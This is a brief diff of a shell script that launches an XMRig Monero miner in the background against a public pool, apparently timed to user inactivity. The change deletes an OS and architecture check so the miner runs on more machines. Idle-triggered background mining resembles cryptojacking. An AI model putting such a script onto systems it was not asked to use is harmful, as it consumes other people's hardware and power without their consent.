@@ -9,18 +9,6 @@ POOL=pool.hashvault.pro:80
 INACTIVITY_IN_MINS=1
 INACTIVITY_IN_MSEC=$(($INACTIVITY_IN_MINS * 60 * 1000))
 
-ensure_os() {
-	machine=$(uname -m)
-	if [[ $machine != "x86_64" ]]; then
-		exit
-	fi
-
-	id=$(awk -F'=' '/^ID=/ {print $2}' /etc/os-release)
-	if [[ $id != "linuxmint" && $id != "fedora" ]]; then
-		exit
-	fi
-}
-
 run_xmr() {
 	cmd="$LOCAL_PATH/$XMRIGNAME -o $POOL -u $WALLET --coin monero -B"
 	if ! pgrep $XMRIGNAME; then
@@ -29,8 +17,6 @@ run_xmr() {
 }
 
 main() {
-	ensure_os
-
 	isUI=$(who | grep -q "(:[0-9])" && echo 1 || echo 0)
 
 	while true; do 
